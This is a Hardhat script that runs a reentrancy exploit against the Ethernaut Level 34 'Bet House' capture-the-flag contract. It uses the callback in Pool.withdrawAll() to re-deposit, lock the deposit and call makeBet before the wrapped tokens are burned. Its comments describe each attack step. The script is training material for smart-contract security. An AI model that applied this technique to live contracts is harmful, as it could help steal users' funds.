import { ethers } from "hardhat";

/**
 * Ethernaut Level 34: Bet House - Attack Execution Script
 *
 * VULNERABILITY: Cross-function reentrancy in Pool.withdrawAll()
 *
 * The withdrawAll() function burns wrapped tokens AFTER the external ETH call.
 * This allows us to exploit the callback to:
 * 1. Re-deposit PDT to increase our wrapped token balance
 * 2. Lock our deposits
 * 3. Call makeBet() while we still have 20+ wrapped tokens
 *
 * After the callback, tokens are burned but we're already registered as a bettor!
 */

async function main() {
  console.log("=== Ethernaut Level 34: Bet House Attack ===\n");

  const [attacker] = await ethers.getSigners();
  console.log(`Attacker: ${attacker.address}`);
  console.log(`Balance: ${ethers.formatEther(await ethers.provider.getBalance(attacker.address))} ETH\n`);

  // Get contract addresses
  let betHouseAddress = process.env.BET_HOUSE_ADDRESS;
  let attackAddress = process.env.ATTACK_ADDRESS;

  if (!betHouseAddress) {
    try {
      const { deployments } = require("hardhat");
      const deployment = await deployments.get("BetHouse");
      betHouseAddress = deployment.address;
    } catch {
      throw new Error("Set BET_HOUSE_ADDRESS environment variable");
    }
  }

  if (!attackAddress) {
    try {
      const { deployments } = require("hardhat");
      const deployment = await deployments.get("BetHouseAttack");
      attackAddress = deployment.address;
    } catch {
      throw new Error("Set ATTACK_ADDRESS or deploy BetHouseAttack first");
    }
  }

  console.log(`BetHouse: ${betHouseAddress}`);
  console.log(`Attack Contract: ${attackAddress}\n`);

  // Get contract instances
  const betHouse = await ethers.getContractAt("BetHouse", betHouseAddress);
  const poolAddress = await betHouse.pool();
  const pool = await ethers.getContractAt("Pool", poolAddress);
  const pdtAddress = await pool.depositToken();
  const wrappedAddress = await pool.wrappedToken();
  const pdt = await ethers.getContractAt("PoolToken", pdtAddress);
  const wrapped = await ethers.getContractAt("PoolToken", wrappedAddress);
  const attack = await ethers.getContractAt("BetHouseAttack", attackAddress);

  console.log(`Pool: ${poolAddress}`);
  console.log(`PDT Token: ${pdtAddress}`);
  console.log(`Wrapped Token: ${wrappedAddress}\n`);

  // Check initial state
  console.log("=== Initial State ===");
  const attackerPDT = await pdt.balanceOf(attacker.address);
  const attackerWrapped = await wrapped.balanceOf(attacker.address);
  const isBettorBefore = await betHouse.isBettor(attacker.address);

  console.log(`Your address: ${attacker.address}`);
  console.log(`Your PDT balance: ${attackerPDT}`);
  console.log(`Your Wrapped balance: ${attackerWrapped}`);
  console.log(`You are bettor: ${isBettorBefore}`);

  if (isBettorBefore) {
    console.log("\n✅ You are already a bettor! Challenge completed.");
    return;
  }

  if (attackerPDT < 5n) {
    console.log("\n❌ Need at least 5 PDT to execute attack!");
    console.log("Make sure you have 5 PDT (the challenge gives you 5 at start)");
    return;
  }

  console.log("\n=== Executing Attack ===\n");

  // Step 1: Transfer PDT to attack contract
  console.log("Step 1: Transfer 5 PDT to attack contract...");
  const transferTx = await pdt.transfer(attackAddress, 5n);
  console.log(`   Tx: ${transferTx.hash}`);
  await transferTx.wait();

  const attackPDT = await pdt.balanceOf(attackAddress);
  console.log(`   ✅ Attack contract PDT balance: ${attackPDT}`);

  // Step 2: Execute the attack with 0.001 ETH, registering YOUR address as bettor
  console.log("\nStep 2: Execute attack (sending 0.001 ETH)...");
  console.log(`   Target bettor: ${attacker.address} (YOUR address)`);
  console.log("   Attack flow:");
  console.log("   a. Deposit 5 PDT + 0.001 ETH → 15 wrapped tokens");
  console.log("   b. Call withdrawAll() → ETH callback triggered");
  console.log("   c. In callback: re-deposit PDT → 20 tokens, lock, makeBet(YOU)");
  console.log("   d. After callback: tokens burned but YOU are a bettor!\n");

  const attackTx = await attack.attack(attacker.address, { value: ethers.parseEther("0.001") });
  console.log(`   Tx: ${attackTx.hash}`);
  const receipt = await attackTx.wait();

  // Parse events
  console.log("\n   Events emitted:");
  for (const log of receipt!.logs) {
    try {
      const parsed = attack.interface.parseLog({ topics: log.topics as string[], data: log.data });
      if (parsed) {
        console.log(`   - ${parsed.name}: ${JSON.stringify(parsed.args, (_, v) => typeof v === 'bigint' ? v.toString() : v)}`);
      }
    } catch {}
  }

  // Verify success
  console.log("\n=== Final State ===");
  const isBettorAfter = await betHouse.isBettor(attacker.address);
  const yourWrappedAfter = await wrapped.balanceOf(attacker.address);
  const yourPDTAfter = await pdt.balanceOf(attacker.address);

  console.log(`Your Wrapped balance: ${yourWrappedAfter}`);
  console.log(`Your PDT balance: ${yourPDTAfter}`);
  console.log(`You are bettor: ${isBettorAfter}`);

  if (isBettorAfter) {
    console.log("\n🎉 SUCCESS! YOU are now a bettor!");
    console.log("\n📚 Vulnerability exploited:");
    console.log("   1. Pool.withdrawAll() has a reentrancy vulnerability");
    console.log("   2. Wrapped tokens are burned AFTER the external ETH call");
    console.log("   3. During callback, we re-deposited PDT to reach 20 tokens");
    console.log("   4. We locked deposits and called makeBet(YOUR_ADDRESS)");
    console.log("   5. After callback, tokens burned but YOUR bettor status persists!");
    console.log("\n🎯 Submit your instance on Ethernaut!");
  } else {
    console.log("\n❌ Attack failed! You are not a bettor.");
  }
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
